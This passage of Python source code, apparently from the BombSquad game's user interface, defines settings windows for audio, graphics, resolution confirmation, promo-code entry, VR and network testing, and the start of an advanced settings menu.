                onValueChangeCall=self._setVRHeadRelativeAudio)
            self._vrHeadRelativeAudioButton = p.getButtonWidget()
            t = bs.textWidget(
                parent=self._rootWidget, position=(width * 0.5, v - 11),
                size=(0, 0),
                text=bs.Lstr(
                    resource=self._r + '.headRelativeVRAudioInfoText'),
                scale=0.5, color=(0.7, 0.8, 0.7),
                maxWidth=400, flatness=1.0, hAlign="center", vAlign="center")
            v -= 30
        else:
            self._vrHeadRelativeAudioButton = None

        if showSoundtracks:
            v -= 1.2*spacing
            self._soundtrackButton = b = bs.buttonWidget(
                parent=self._rootWidget, position=((width - 310) / 2, v),
                size=(310, 50),
                autoSelect=True, label=bs.Lstr(
                    resource=self._r + '.soundtrackButtonText'),
                onActivateCall=self._doSoundtracks)
            v -= spacing*0.5
            bs.textWidget(
                parent=self._rootWidget, position=(0, v),
                size=(width, 20),
                text=bs.Lstr(
                    resource=self._r + '.soundtrackDescriptionText'),
                flatness=1.0, hAlign='center', scale=0.5,
                color=(0.7, 0.8, 0.7, 1.0),
                maxWidth=400)
        else:
            self._soundtrackButton = None

        # tweak a few navigation bits
        try:
            bs.widget(edit=backButton, downWidget=sv['minusButton'])
        except Exception:
            bs.printException('error wiring ConfigAudioWindow')

        self._restore_state()

    def _setVRHeadRelativeAudio(self, val):
        bs.getConfig()['VR Head Relative Audio'] = val
        bs.applySettings()
        bs.writeConfig()

    def _doSoundtracks(self):
        # we require disk access for soundtracks;
        # if we don't have it, request it..
        if not bsInternal._havePermission("storage"):
            bs.playSound(bs.getSound('ding'))
            bs.screenMessage(
                bs.Lstr(resource='storagePermissionAccessText'),
                color=(0.5, 1, 0.5))
            bs.realTimer(1000, bs.Call(
                bsInternal._requestPermission, "storage"))
            return

        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = SoundtracksWindow(
            originWidget=self._soundtrackButton).getRootWidget()

    def _back(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        uiGlobals['mainMenuWindow'] = SettingsWindow(
            transition='inLeft').getRootWidget()

    def _save_state(self):
        try:
            sel = self._rootWidget.getSelectedChild()
            if sel == self._soundVolumeWidgets['minusButton']:
                selName = 'SoundMinus'
            elif sel == self._soundVolumeWidgets['plusButton']:
                selName = 'SoundPlus'
            elif sel == self._musicVolumeWidgets['minusButton']:
                selName = 'MusicMinus'
            elif sel == self._musicVolumeWidgets['plusButton']:
                selName = 'MusicPlus'
            elif sel == self._soundtrackButton:
                selName = 'Soundtrack'
            elif sel == self._backButton:
                selName = 'Back'
            elif sel == self._vrHeadRelativeAudioButton:
                selName = 'VRHeadRelative'
            else:
                raise Exception("unrecognized selected widget")
            gWindowStates[self.__class__.__name__] = selName
        except Exception:
            bs.printException('error saving state for', self.__class__)

    def _restore_state(self):
        try:
            try:
                selName = gWindowStates[self.__class__.__name__]
            except Exception:
                selName = None
            if selName == 'SoundMinus':
                sel = self._soundVolumeWidgets['minusButton']
            elif selName == 'SoundPlus':
                sel = self._soundVolumeWidgets['plusButton']
            elif selName == 'MusicMinus':
                sel = self._musicVolumeWidgets['minusButton']
            elif selName == 'MusicPlus':
                sel = self._musicVolumeWidgets['plusButton']
            elif selName == 'VRHeadRelative':
                sel = self._vrHeadRelativeAudioButton
            elif selName == 'Soundtrack':
                sel = self._soundtrackButton
            elif selName == 'Back':
                sel = self._backButton
            else:
                sel = self._backButton
            bs.containerWidget(edit=self._rootWidget, selectedChild=sel)
        except Exception:
            bs.printException('error restoring state for', self.__class__)


class GraphicsWindow(Window):

    def __init__(self, transition='inRight', originWidget=None):

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        self._r = 'graphicsSettingsWindow'
        env = bs.getEnvironment()

        spacing = 32
        self._haveSelectedChild = False
        ua = env['userAgentString']
        interfaceType = env['interfaceType']
        width = 450
        height = 302

        self._showFullscreen = False
        fullscreenSpacingTop = spacing*0.2
        fullscreenSpacing = spacing*1.2
        if interfaceType == 'large' and env['platform'] != 'android':
            self._showFullscreen = True
            height += fullscreenSpacing+fullscreenSpacingTop

        showGamma = False
        gammaSpacing = spacing*1.3
        if bsInternal._hasGammaControl():
            showGamma = True
            height += gammaSpacing

        showVSync = False
        if 'Mac' in ua or 'macos' in ua:
            showVSync = True

        showResolution = True
        if env['vrMode']:
            if (env['platform'] == 'android'
                    and env['subplatform'] == 'cardboard'):
                showResolution = True
            else:
                showResolution = False

        baseScale = 2.4 if gSmallUI else 1.5 if gMedUI else 1.0
        popupMenuScale = baseScale*1.2
        v = height - 50
        v -= spacing*1.15
        self._rootWidget = bs.containerWidget(
            size=(width, height),
            transition=transition, scaleOriginStackOffset=scaleOrigin,
            scale=baseScale, stackOffset=(0, -30) if gSmallUI else(0, 0))

        backButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(35, height - 50),
            size=(120, 60),
            scale=0.8, textScale=1.2, autoSelect=True, label=bs.Lstr(
                resource='backText'),
            buttonType='back', onActivateCall=self._back)

        bs.containerWidget(edit=self._rootWidget, cancelButton=b)

        t = bs.textWidget(
            parent=self._rootWidget, position=(0, height - 44),
            size=(width, 25),
            text=bs.Lstr(resource=self._r + '.titleText'),
            color=gTitleColor, hAlign="center", vAlign="top")

        if gDoAndroidNav:
            bs.buttonWidget(
                edit=b, buttonType='backSmall', size=(60, 60),
                label=bs.getSpecialChar('back'))

        if self._showFullscreen:
            v -= fullscreenSpacingTop
            self._fullscreenCheckBox = configCheckBox(
                parent=self._rootWidget, position=(100, v),
                maxWidth=200, size=(300, 30),
                name="Fullscreen", displayName=bs.Lstr(
                    resource=self._r +
                    ('.fullScreenCmdText'
                     if 'Mac' in ua else '.fullScreenCtrlText')))
            if not self._haveSelectedChild:
                bs.containerWidget(
                    edit=self._rootWidget,
                    selectedChild=self._fullscreenCheckBox)
                self._haveSelectedChild = True
            v -= fullscreenSpacing
        else:
            self._fullscreenCheckBox = None

        if showGamma:
            self._gammaControls = tb = configTextBox(
                parent=self._rootWidget, position=(90, v),
                name="Screen Gamma", displayName=bs.Lstr(
                    resource=self._r + '.gammaText'),
                type="float", minVal=0.1, maxVal=2.0, increment=0.1, xOffset=-
                70, textScale=0.85)
            if gToolbars:
                bs.widget(edit=tb['plusButton'],
                          rightWidget=bsInternal._getSpecialWidget(
                              'partyButton'))

            if not self._haveSelectedChild:
                bs.containerWidget(edit=self._rootWidget,
                                   selectedChild=tb['minusButton'])
                self._haveSelectedChild = True
            v -= gammaSpacing
        else:
            self._gammaControls = None

        self._selectedColor = (0.5, 1, 0.5, 1)
        self._unselectedColor = (0.7, 0.7, 0.7, 1)

        # quality
        hOffs = 15
        t = bs.textWidget(
            parent=self._rootWidget, position=(60, v),
            size=(160, 25),
            text=bs.Lstr(resource=self._r + '.visualsText'),
            color=gHeadingColor, scale=0.65, maxWidth=150, hAlign="center",
            vAlign="center")
        visualsPopup = PopupMenu(
            parent=self._rootWidget, position=(60, v - 50),
            width=150, scale=popupMenuScale,
            choices=['Auto', 'Higher', 'High', 'Medium', 'Low'],
            choicesDisabled=['Higher', 'High']
            if bsInternal._getMaxGraphicsQuality() == 'Medium' else[],
            choicesDisplay=[bs.Lstr(resource='autoText'),
                            bs.Lstr(resource=self._r + '.higherText'),
                            bs.Lstr(resource=self._r + '.highText'),
                            bs.Lstr(resource=self._r + '.mediumText'),
                            bs.Lstr(resource=self._r + '.lowText')],
            currentChoice=bsInternal._getSetting('Graphics Quality'),
            onValueChangeCall=self._setQuality)

        # texture controls
        hOffs = 210
        t = bs.textWidget(
            parent=self._rootWidget, position=(230, v),
            size=(160, 25),
            text=bs.Lstr(resource=self._r + '.texturesText'),
            color=gHeadingColor, scale=0.65, maxWidth=150, hAlign="center",
            vAlign="center")
        texturesPopup = PopupMenu(
            parent=self._rootWidget, position=(230, v - 50),
            width=150, scale=popupMenuScale,
            choices=['Auto', 'High', 'Medium', 'Low'],
            choicesDisplay=[bs.Lstr(resource='autoText'),
                            bs.Lstr(resource=self._r + '.highText'),
                            bs.Lstr(resource=self._r + '.mediumText'),
                            bs.Lstr(resource=self._r + '.lowText')],
            currentChoice=bsInternal._getSetting('Texture Quality'),
            onValueChangeCall=self._setTextures)
        if gToolbars:
            bs.widget(edit=texturesPopup.getButtonWidget(),
                      rightWidget=bsInternal._getSpecialWidget('partyButton'))
        v -= 80

        hOffs = 0

        if showResolution:
            # resolution
            t = bs.textWidget(
                parent=self._rootWidget, position=(hOffs + 60, v),
                size=(160, 25),
                text=bs.Lstr(resource=self._r + '.resolutionText'),
                color=gHeadingColor, scale=0.65, maxWidth=150, hAlign="center",
                vAlign="center")

            # on standard android we have 'Auto', 'Native', and a few
            # HD standards
            if env['platform'] == 'android':
                # on cardboard/daydream android we have a few
                # render-target-scale options
                if env['subplatform'] == 'cardboard':
                    currentRes = str(min(100, max(
                        10, int(round(bsInternal._getSetting(
                            'GVR Render Target Scale')*100.0)))))+'%'
                    resPopup = PopupMenu(
                        parent=self._rootWidget, position=(hOffs + 60, v - 50),
                        width=120, scale=popupMenuScale,
                        choices=['100%', '75%', '50%', '35%'],
                        currentChoice=currentRes,
                        onValueChangeCall=self._setGVRRenderTargetScale)
                else:
                    nativeRes = bsInternal._getDisplayResolution()
                    choices = ['Auto', 'Native']
                    choicesDisplay = [
                        bs.Lstr(resource='autoText'),
                        bs.Lstr(resource='nativeText')]
                    for res in [1440, 1080, 960, 720, 480]:
                        # nav bar is 72px so lets allow for that in what
                        # choices we show
                        if nativeRes[1] >= res-72:
                            resStr = str(res)+'p'
                            choices.append(resStr)
                            choicesDisplay.append(bs.Lstr(value=resStr))
                    currentRes = bsInternal._getSetting('Resolution (Android)')
                    resPopup = PopupMenu(
                        parent=self._rootWidget, position=(hOffs + 60, v - 50),
                        width=120, scale=popupMenuScale, choices=choices,
                        choicesDisplay=choicesDisplay, currentChoice=currentRes,
                        onValueChangeCall=self._setAndroidRes)

            else:

                # if we're on a system that doesn't allow setting resolution,
                # set pixel-scale instead
                currentRes = bsInternal._getDisplayResolution()
                if currentRes is None:
                    currentRes = str(min(100, max(
                        10, int(round(bsInternal._getSetting(
                            'Screen Pixel Scale')*100.0)))))+'%'
                    resPopup = PopupMenu(
                        parent=self._rootWidget, position=(hOffs + 60, v - 50),
                        width=120, scale=popupMenuScale,
                        choices=['100%', '88%', '75%', '63%', '50%'],
                        currentChoice=currentRes,
                        onValueChangeCall=self._setPixelScale)
                else:
                    raise Exception(
                        'obsolete path; discrete resolutions'
                        ' no longer supported')
        hOffs = 210

        # vsync
        if showVSync:
            t = bs.textWidget(
                parent=self._rootWidget, position=(230, v),
                size=(160, 25),
                text=bs.Lstr(resource=self._r + '.verticalSyncText'),
                color=gHeadingColor, scale=0.65, maxWidth=150, hAlign="center",
                vAlign="center")

            vSyncPopup = PopupMenu(
                parent=self._rootWidget, position=(230, v - 50),
                width=150, scale=popupMenuScale,
                choices=['Auto', 'Always', 'Never'],
                choicesDisplay=[bs.Lstr(resource='autoText'),
                                bs.Lstr(resource=self._r + '.alwaysText'),
                                bs.Lstr(resource=self._r + '.neverText')],
                currentChoice=bsInternal._getSetting('Vertical Sync'),
                onValueChangeCall=self._setVSync)
        else:
            vSyncPopup = None

        v -= 90
        fpsc = configCheckBox(
            parent=self._rootWidget, position=(69, v - 6),
            size=(210, 30),
            scale=0.86, name="Show FPS", displayName=bs.Lstr(
                resource=self._r + '.showFPSText'),
            maxWidth=130)

        # (tv mode doesnt apply to vr)
        if not bs.getEnvironment()['vrMode']:
            tvc = configCheckBox(
                parent=self._rootWidget, position=(240, v - 6),
                size=(210, 30),
                scale=0.86, name="TV Border", displayName=bs.Lstr(
                    resource=self._r + '.tvBorderText'),
                maxWidth=130)
            # grumble..
            bs.widget(edit=fpsc, rightWidget=tvc)

        try:
            pass

        except Exception:
            bs.printException('Exception wiring up graphics settings UI:')

        v -= spacing

        # make a timer to update our controls in case the config changes
        # under us
        self._updateTimer = bs.Timer(
            250, bs.WeakCall(self._updateControls),
            repeat=True, timeType='real')

    def _back(self):
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        uiGlobals['mainMenuWindow'] = SettingsWindow(
            transition='inLeft').getRootWidget()

    def _setQuality(self, quality):
        bs.getConfig()['Graphics Quality'] = quality
        bs.applySettings()
        bs.writeConfig()

    def _setTextures(self, val):
        bs.getConfig()['Texture Quality'] = val
        bs.applySettings()
        bs.writeConfig()

    def _setAndroidRes(self, val):
        bs.getConfig()['Resolution (Android)'] = val
        bs.writeConfig()
        bs.applySettings()

    def _setPixelScale(self, res):
        bs.getConfig()['Screen Pixel Scale'] = float(res[:-1])/100.0
        bs.writeConfig()
        bs.applySettings()

    def _setGVRRenderTargetScale(self, res):
        bs.getConfig()['GVR Render Target Scale'] = float(res[:-1])/100.0
        bs.writeConfig()
        bs.applySettings()

    def _setRes(self, res, confirm=True, playSound=False):
        self._oldRes = bsInternal._getDisplayResolution()

        if playSound:
            bs.playSound(bs.getSound('swish'))

        bs.getConfig()['Screen Resolution'] = res

        bs.writeConfig()
        bs.applySettings()

        rp = self._resPopup()
        if rp is not None:
            rp.setChoice(res)

        # if we're changing resolution in fullscreen mode, bring up a
        # confirmation window to make sure the res is visible
        if self._oldRes != res and confirm and bsInternal._getSetting(
                'Fullscreen'):
            ResChangeConfirmWindow(self)

    def _setVSync(self, val):
        bs.getConfig()['Vertical Sync'] = val
        bs.applySettings()
        bs.writeConfig()

    def _updateControls(self):
        if self._showFullscreen:
            bs.checkBoxWidget(edit=self._fullscreenCheckBox,
                              value=bsInternal._getSetting('Fullscreen'))


class ResChangeConfirmWindow(object):

    def __init__(self, configGraphicsWindow):
        self._configGraphicsWindow = configGraphicsWindow
        width = 550
        height = 200
        self._rootWidget = bs.containerWidget(
            size=(width, height), transition='inRight')
        self._confirmCounter = 10
        t = bs.textWidget(
            parent=self._rootWidget, position=(15, height - 80),
            size=(width - 30, 30),
            text=bs.Lstr(resource='keepTheseSettingsText'),
            maxWidth=width * 0.95, color=(0, 1, 0, 1),
            scale=1.3, hAlign="center", vAlign="center")
        self._timeText = bs.textWidget(
            parent=self._rootWidget, position=(15, 40),
            size=(width - 30, 30),
            text=("10"),
            hAlign="center", vAlign="top")
        self._revertButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(25, 40),
            size=(160, 50),
            label=bs.Lstr(resource='revertText'),
            onActivateCall=self._revert)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)
        b = bs.buttonWidget(
            parent=self._rootWidget, position=(width - 190, 40),
            size=(160, 50),
            label=bs.Lstr(resource='keepText'),
            onActivateCall=self._keep)
        self._timer = bs.Timer(
            1000, bs.WeakCall(self._tick),
            repeat=True, timeType='real')

    def _keep(self):
        self._timer = None
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')

    def _revert(self):
        self._timer = None
        self._configGraphicsWindow._setRes(
            self._configGraphicsWindow._oldRes, confirm=False, playSound=True)
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')

    def _tick(self):
        self._confirmCounter -= 1
        bs.textWidget(edit=self._timeText, text=str(self._confirmCounter))
        if self._confirmCounter == 0:
            self._revertButton.activate()


def _promoCodeCallback(data):
    if data is None:
        bs.screenMessage(
            bs.Lstr(resource='promoSubmitErrorText'),
            color=(1, 0, 0))
        bs.playSound(bs.getSound('error'))
    else:
        if data['success']:
            bs.screenMessage(
                bs.Lstr(translate=('promoCodeResponses', data['message'])),
                color=(0, 1, 0))
            bs.playSound(bs.getSound('ding'))
        else:
            bs.screenMessage(
                bs.Lstr(translate=('promoCodeResponses', data['message'])),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))


class PromoCodeWindow(Window):
    def __init__(self, transition='inRight', modal=False, originWidget=None):

        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None
            transition = 'inRight'

        width = 450
        height = 230
        spacing = 32

        self._modal = modal
        self._r = 'promoCodeWindow'

        self._rootWidget = bs.containerWidget(
            size=(width, height),
            transition=transition, toolbarVisibility='MENU_MINIMAL_NOBACK',
            scaleOriginStackOffset=scaleOrigin, scale=2.0
            if gSmallUI else 1.5 if gMedUI else 1.0)

        b = bs.buttonWidget(
            parent=self._rootWidget, scale=0.5, position=(40, height - 40),
            size=(60, 60),
            label='', onActivateCall=self._doBack, autoSelect=True,
            color=(0.55, 0.5, 0.6),
            icon=bs.getTexture('crossOut'),
            iconScale=1.2)

        bs.textWidget(
            parent=self._rootWidget, text=bs.Lstr(
                resource=self._r + '.codeText'),
            position=(22, height - 113),
            color=(0.8, 0.8, 0.8, 1.0),
            size=(90, 30),
            hAlign='right')
        self._textField = bs.textWidget(
            parent=self._rootWidget, position=(125, height - 121),
            size=(280, 46),
            text='', hAlign="left", vAlign="center", maxChars=64,
            color=(0.9, 0.9, 0.9, 1.0),
            description=bs.Lstr(resource=self._r + '.codeText'),
            editable=True, padding=4,
            onReturnPressCall=self._activateEnterButton)
        bs.widget(edit=b, downWidget=self._textField)

        bWidth = 200
        self._enterButton = b2 = bs.buttonWidget(
            parent=self._rootWidget,
            position=(width * 0.5 - bWidth * 0.5, height - 200),
            size=(bWidth, 60),
            scale=1.0, label=bs.Lstr(
                resource='submitText', fallbackResource=self._r + '.enterText'),
            onActivateCall=self._doEnter)
        bs.containerWidget(
            edit=self._rootWidget, cancelButton=b, startButton=b2,
            selectedChild=self._textField)

    def _doBack(self):
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        if not self._modal:
            uiGlobals['mainMenuWindow'] = AdvancedSettingsWindow(
                transition='inLeft').getRootWidget()

    def _activateEnterButton(self):
        self._enterButton.activate()

    def _doEnter(self):
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        if not self._modal:
            uiGlobals['mainMenuWindow'] = AdvancedSettingsWindow(
                transition='inLeft').getRootWidget()
        bsInternal._addTransaction(
            {'type': 'PROMO_CODE', 'expireTime': time.time() + 5,
             'code': bs.textWidget(query=self._textField)})
        bsInternal._runTransactions()


gValueTestDefaults = {}


class TestingWindow(Window):
    def __init__(self, title, entries, transition='inRight'):
        global gValueTestDefaults
        self._width = 600
        self._height = 324 if gSmallUI else 400
        self._entries = copy.deepcopy(entries)
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            transition=transition, scale=2.5
            if gSmallUI else 1.2 if gMedUI else 1.0, stackOffset=(0, -28)
            if gSmallUI else(0, 0))
        self._backButton = b = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True,
            position=(65, self._height - 59),
            size=(130, 60),
            scale=0.8, textScale=1.2, label=bs.Lstr(resource='backText'),
            buttonType='back', onActivateCall=self._doBack)
        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 35),
            size=(0, 0),
            color=gTitleColor, hAlign='center', vAlign='center', maxWidth=245,
            text=title)

        if gDoAndroidNav:
            bs.buttonWidget(
                edit=self._backButton, buttonType='backSmall', size=(60, 60),
                label=bs.getSpecialChar('back'))

        t = bs.textWidget(parent=self._rootWidget,
                          position=(self._width * 0.5, self._height - 75),
                          size=(0, 0),
                          color=gInfoTextColor, hAlign='center',
                          vAlign='center', maxWidth=self._width * 0.75,
                          text=bs.Lstr(
                              resource='settingsWindowAdvanced.forTestingText'))
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)
        self._scrollWidth = self._width - 130
        self._scrollHeight = self._height - 140
        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget,
            size=(self._scrollWidth, self._scrollHeight),
            highlight=False,
            position=((self._width - self._scrollWidth) * 0.5, 40))
        bs.containerWidget(edit=self._scrollWidget, claimsLeftRight=True)

        self._spacing = 50

        self._subWidth = self._scrollWidth*0.95
        self._subHeight = 50 + len(self._entries)*self._spacing + 60
        self._subContainer = bs.containerWidget(
            parent=self._scrollWidget, size=(
                self._subWidth, self._subHeight), background=False)

        h = 230
        v = self._subHeight - 48

        for i, entry in enumerate(self._entries):

            entryName = entry['name']

            # if we havn't yet, record the default value for this name so we can
            # reset if we want..
            if not entryName in gValueTestDefaults:
                gValueTestDefaults[entryName] = bsInternal._valueTest(entryName)

            t = bs.textWidget(parent=self._subContainer, position=(h, v), size=(
                0, 0), hAlign='right', vAlign='center', maxWidth=200,
                              text=entry['label'])
            b = bs.buttonWidget(parent=self._subContainer,
                                position=(h + 20, v - 19),
                                size=(40, 40),
                                autoSelect=True, repeat=True,
                                leftWidget=self._backButton,
                                buttonType='square', label='-',
                                onActivateCall=bs.Call(
                                    self._onMinusPress, entry['name']))
            if i == 0:
                bs.widget(edit=b, upWidget=self._backButton)
            bs.widget(edit=b, showBufferTop=20, showBufferBottom=20)
            entry['widget'] = t = bs.textWidget(
                parent=self._subContainer, position=(h + 100, v),
                size=(0, 0),
                hAlign='center', vAlign='center', maxWidth=60,
                text=str(round(bsInternal._valueTest(entryName),
                               4)))
            b = bs.buttonWidget(parent=self._subContainer,
                                position=(h + 140, v - 19),
                                size=(40, 40),
                                autoSelect=True, repeat=True,
                                buttonType='square', label='+',
                                onActivateCall=bs.Call(
                                    self._onPlusPress, entry['name']))
            if i == 0:
                bs.widget(edit=b, upWidget=self._backButton)
            v -= self._spacing
        v -= 35
        bReset = bs.buttonWidget(
            parent=self._subContainer, autoSelect=True, size=(200, 50),
            position=(self._subWidth * 0.5 - 100, v),
            label=bs.Lstr(resource='settingsWindowAdvanced.resetText'),
            rightWidget=b, onActivateCall=self._onResetPress)
        bs.widget(edit=bReset, showBufferTop=20, showBufferBottom=20)

    def _getEntry(self, name):
        for entry in self._entries:
            if entry['name'] == name:
                return entry

    def _onResetPress(self):
        for entry in self._entries:
            val = bsInternal._valueTest(
                entry['name'],
                absolute=gValueTestDefaults[entry['name']])
            bs.textWidget(edit=entry['widget'], text=str(
                round(bsInternal._valueTest(entry['name']), 4)))

    def _onMinusPress(self, entryName):
        entry = self._getEntry(entryName)
        val = bsInternal._valueTest(entry['name'], change=-entry['increment'])
        bs.textWidget(edit=entry['widget'], text=str(
            round(bsInternal._valueTest(entry['name']), 4)))

    def _onPlusPress(self, entryName):
        entry = self._getEntry(entryName)
        val = bsInternal._valueTest(entry['name'], change=entry['increment'])
        bs.textWidget(edit=entry['widget'], text=str(
            round(bsInternal._valueTest(entry['name']), 4)))

    def _doBack(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = AdvancedSettingsWindow(
            transition='inLeft').getRootWidget()


class VRTestingWindow(TestingWindow):
    def __init__(self, transition='inRight'):

        entries = []
        env = bs.getEnvironment()
        # these are gear-vr only
        if env['platform'] == 'android' and env['subplatform'] == 'oculus':
            entries += [
                {'name': 'timeWarpDebug', 'label': 'Time Warp Debug',
                 'increment': 1.0},
                {'name': 'chromaticAberrationCorrection',
                 'label': 'Chromatic Aberration Correction', 'increment': 1.0},
                {'name': 'vrMinimumVSyncs', 'label': 'Minimum Vsyncs',
                 'increment': 1.0},
                # {'name':'eyeOffsX','label':'Eye IPD','increment':0.001}
            ]
        # cardboard/gearvr get eye offset controls..
        # if env['platform'] == 'android':
        #     entries += [
        #         {'name':'eyeOffsY','label':'Eye Offset Y','increment':0.01},
        #         {'name':'eyeOffsZ','label':'Eye Offset Z','increment':0.005}]
        # everyone gets head-scale
        entries += [{'name': 'headScale',
                     'label': 'Head Scale', 'increment': 1.0}]
        # and everyone gets all these..
        entries += [
            {'name': 'vrCamOffsetY', 'label': 'In-Game Cam Offset Y',
             'increment': 0.1},
            {'name': 'vrCamOffsetZ', 'label': 'In-Game Cam Offset Z',
             'increment': 0.1},
            {'name': 'vrOverlayScale', 'label': 'Overlay Scale',
             'increment': 0.025},
            {'name': 'allowCameraMovement', 'label': 'Allow Camera Movement',
             'increment': 1.0},
            {'name': 'cameraPanSpeedScale', 'label': 'Camera Movement Speed',
             'increment': 0.1},
            {'name': 'showOverlayBounds', 'label': 'Show Overlay Bounds',
             'increment': 1},
        ]

        TestingWindow.__init__(
            self, bs.Lstr(resource='settingsWindowAdvanced.vrTestingText'),
            entries, transition)


class NetTestingWindow(TestingWindow):
    def __init__(self, transition='inRight'):

        entries = [{'name': 'bufferTime', 'label': 'Buffer Time',
                    'increment': 1.0},
                   {'name': 'delaySampling', 'label': 'Delay Sampling',
                    'increment': 1.0},
                   {'name': 'dynamicsSyncTime', 'label': 'Dynamics Sync Time',
                    'increment': 10},
                   {'name': 'showNetInfo', 'label': 'Show Net Info',
                    'increment': 1},
                   ]
        TestingWindow.__init__(
            self, bs.Lstr(resource='settingsWindowAdvanced.netTestingText'),
            entries, transition)


class AdvancedSettingsWindow(Window):

    def __init__(self, transition='inRight', originWidget=None):

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        self._width = 870 if gSmallUI else 670
        xInset = 100 if gSmallUI else 0
        self._height = 390 if gSmallUI else 450 if gMedUI else 520
        self._spacing = 32
        self._menuOpen = False
        topExtra = 10 if gSmallUI else 0
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + topExtra),
            transition=transition, toolbarVisibility='MENU_MINIMAL',
            scaleOriginStackOffset=scaleOrigin, scale=2.06
            if gSmallUI else 1.4 if gMedUI else 1.0, stackOffset=(0, -25)
            if gSmallUI else(0, 0))
        self._prevLang = ""
        self._prevLangList = []
        self._completeLangsList = None
        self._completeLangsError = False
        self._languagePopup = None

        # in vr-mode, the internal keyboard is currently the *only* option,
        # so no need to show this..
        self._showAlwaysUseInternalKeyboard = False if bs.getEnvironment()[
            'vrMode'] else True

        self._scrollWidth = self._width - (100+2*xInset)
        self._scrollHeight = self._height - 115
        self._subWidth = self._scrollWidth*0.95
        self._subHeight = 732+8+60-60+40-40

        if self._showAlwaysUseInternalKeyboard:
            self._subHeight += 62

        self._doVRTestButton = True if bs.getEnvironment()['vrMode'] else False

        self._doNetTestButton = True

        self._extraButtonSpacing = self._spacing * 2.5

        if self._doVRTestButton:
            self._subHeight += self._extraButtonSpacing
        if self._doNetTestButton:
            self._subHeight += self._extraButtonSpacing

        self._r = 'settingsWindowAdvanced'

        if gToolbars and gSmallUI:
            bs.containerWidget(edit=self._rootWidget, onCancelCall=self._doBack)
            self._backButton = None
        else:
            self._backButton = backButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(53 + xInset, self._height - 60),
                size=(140, 60),
                scale=0.8, autoSelect=True, label=bs.Lstr(
                    resource='backText'),
                buttonType='back', onActivateCall=self._doBack)
            bs.containerWidget(edit=self._rootWidget,
                               cancelButton=self._backButton)

        self._titleText = t = bs.textWidget(
            parent=self._rootWidget, position=(0, self._height - 52),
            size=(self._width, 25),
            text=bs.Lstr(resource=self._r + '.titleText'),
            color=gTitleColor, hAlign="center", vAlign="top")

        if gDoAndroidNav:
            if self._backButton is not None:
                bs.buttonWidget(
                    edit=self._backButton, buttonType='backSmall', size=(
                        60, 60), label=bs.getSpecialChar('back'))

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, position=(50 + xInset, 50),
            simpleCullingV=20.0, highlight=False,
            size=(self._scrollWidth, self._scrollHeight))
        bs.containerWidget(edit=self._scrollWidget, selectionLoopToParent=True)
        self._subContainer = c = bs.containerWidget(
            parent=self._scrollWidget, size=(self._subWidth, self._subHeight),
            background=False, selectionLoopToParent=True)

        self._rebuild()

        # rebuild periodically to pick up language changes/additions/etc
        self._rebuildTimer = bs.Timer(
            1000, bs.WeakCall(self._rebuild),
            repeat=True, timeType='real')

        # fetch the list of completed languages
        bsUtils.serverGet(
            'bsLangGetCompleted', {},
            callback=bs.WeakCall(self._completedLangsCB))

    def _updateLangStatus(self):
        if self._completeLangsList is not None:
            upToDate = (bs.getLanguage() in self._completeLangsList)
            t = bs.textWidget(
                edit=self._langStatusText, text=''
                if bs.getLanguage() == 'Test' else bs.Lstr(
                    resource=self._r + '.translationNoUpdateNeededText')
                if upToDate else bs.Lstr(
                    resource=self._r + '.translationUpdateNeededText'),
                color=(0.2, 1.0, 0.2, 0.8)
                if upToDate else(1.0, 0.2, 0.2, 0.8))
        else:
            t = bs.textWidget(
                edit=self._langStatusText, text=bs.Lstr(
                    resource=self._r + '.translationFetchErrorText')
                if self._completeLangsError else bs.Lstr(
                    resource=self._r + '.translationFetchingStatusText'),
                color=(1.0, 0.5, 0.2)
                if self._completeLangsError else(0.7, 0.7, 0.7))

    def _rebuild(self):

        # dont rebuild if the menu is open or if our language and language-list
        # hasn't changed
        # NOTE - although we now support widgets updating their own
        # translations, we still change the label formatting on the language
        # menu based on the language so still need this. ...however we could
        # make this more limited to it only rebuilds that one menu instead
        # of everything.
        if self._menuOpen or(
                self._prevLang == bs.getLanguage(returnNoneForDefault=True)
                and self._prevLangList == bsUtils._getLanguages()):
            return
        self._prevLang = bs.getLanguage(returnNoneForDefault=True)
        self._prevLangList = bsUtils._getLanguages()

        # clear out our sub-container
        children = self._subContainer.getChildren()
        for c in children:
            c.delete()

        v = self._subHeight - 35

        v -= self._spacing * 1.2

        # update our existing back button and title
        if self._backButton is not None:
            bs.buttonWidget(edit=self._backButton, label=bs.Lstr(
                resource='backText'))
            if gDoAndroidNav:
                bs.buttonWidget(edit=self._backButton,
                                label=bs.getSpecialChar('back'))

        bs.textWidget(edit=self._titleText,
                      text=bs.Lstr(resource=self._r+'.titleText'))

        thisButtonWidth = 410

